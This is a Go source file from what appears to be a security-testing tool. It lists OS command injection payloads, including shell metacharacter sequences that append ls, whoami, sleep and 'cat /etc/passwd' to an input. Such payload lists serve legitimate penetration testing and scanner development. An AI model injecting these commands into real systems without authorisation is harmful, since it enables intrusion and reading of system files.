package techniques

// CommandInjectionPayloads for OS command injection testing.
var CommandInjectionPayloads = []string{
	"; ls",
	"| ls",
	"& ls",
	"`ls`",
	"$(ls)",
	"; cat /etc/passwd",
	"| cat /etc/passwd",
	"& cat /etc/passwd",
	"; whoami",
	"| whoami",
	"; sleep 5",
	"| sleep 5",
	"& sleep 5",
	"`sleep 5`",
	"$(sleep 5)",
}

// CommandInjectionDescription describes the command injection technique.
const CommandInjectionDescription = "Command Injection - Tests for OS command injection by injecting shell metacharacters"
